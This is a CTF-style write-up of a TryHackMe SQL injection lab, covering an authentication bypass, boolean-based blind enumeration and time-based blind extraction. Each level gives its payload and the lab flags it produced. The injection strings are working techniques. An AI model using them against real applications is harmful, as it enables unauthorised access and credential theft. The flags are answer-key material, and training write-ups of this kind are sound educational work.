# TryHackMe: SQL Injection Lab Walkthrough
This documentation outlines the complete exploitation process for the TryHackMe SQL Injection lab, covering authentication bypasses, boolean-based blind injection, time-based blind injection, and final flag verification.

### Task 6: Blind SQLi - Authentication Bypass (Level Two)
Vulnerable Field: Password input box
Objective: Bypass authentication to retrieve the Level Two flag.
Exploitation Details
- Payload Used: ```' OR 1=1;--``` entered into the password field
- Executed Query:
```sql
select * from users where username='admin' and password='' OR 1=1;--' LIMIT 1;
```
- Flag: ```THM{SQL_INJECTION_3840}```

### Task 7: Blind SQLi - Boolean Based (Level Three)
Vulnerable Field: Username input field
Application Behavior: Returns ```{"taken":true}``` when a SQL condition evaluates to true and ```{"taken":false}``` when false.
Step-by-Step Enumeration Process
1. Determine Column Count:
```sql
admin123' UNION SELECT 1,2,3;--
```
Response: ```{"taken":true}``` (confirms query accepts 3 columns)

2. Discover Database Name:
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```
Resulting Database: ```sqli_three```

3. Enumerate Table Names:
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'u%';--
```
Response: ```{"taken":true}``` (confirms target table ```users```)

4. Enumerate Credentials:
- Username Check:
```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
```
Response: ```{"taken":true}``` (confirms target user ```admin```)
- Password Character Bruteforce:
```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '3%';--
```
Response: ```{"taken":true}```
- Full Password Verification:
```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '3845';--
```
Response: ```{"taken":true}```

5. Discovered Credentials: ```admin : 3845```
6. Flag: ```THM{SQL_INJECTION_9581}```

### Task 8: Blind SQLi - Time Based (Level Four)
Vulnerable Vector: HTTP GET ```referrer``` parameter
Application Behavior: Evaluates time delays via database ```SLEEP()``` functions.
Exploitation Details
- Payload Used:
```sql
referrer=admin123' UNION SELECT 1, SLEEP(1) FROM users WHERE username='admin' AND password LIKE '4961%';--
```
- Executed Query:
```sql
select * from analytics_referrers where domain='referrer=admin123' UNION SELECT 1, SLEEP(1) from users where username='admin' and password like '4961%';--' LIMIT 1
```
- Response Delay: ```1.002s``` (confirms password match)
- Extracted Password: ```4961```
- Flag: ```THM{SQL_INJECTION_1093}```

| Task Summary & Completion FlagsLevel     | Vulnerability Type           | Target Payload / Vector                        | Flag                       |
|:--                                       |:--                           |:--                                             |:--                         |
| Level Two                                | Authentication Bypass        | ' OR 1=1;--                                    | THM{SQL_INJECTION_3840}    |
| Level Three                              | Boolean-Based Blind          | "admin123' UNION SELECT 1,2,3..."              | THM{SQL_INJECTION_9581}    |
| Level Four                               | Time-Based Blind             | "referrer=... UNION SELECT 1   SLEEP(1)..."    | THM{SQL_INJECTION_1093}    | 
| Level Five                               | Lab Completion               | N/A                                            | THM{SQL_INJECTION_MASTER}  |
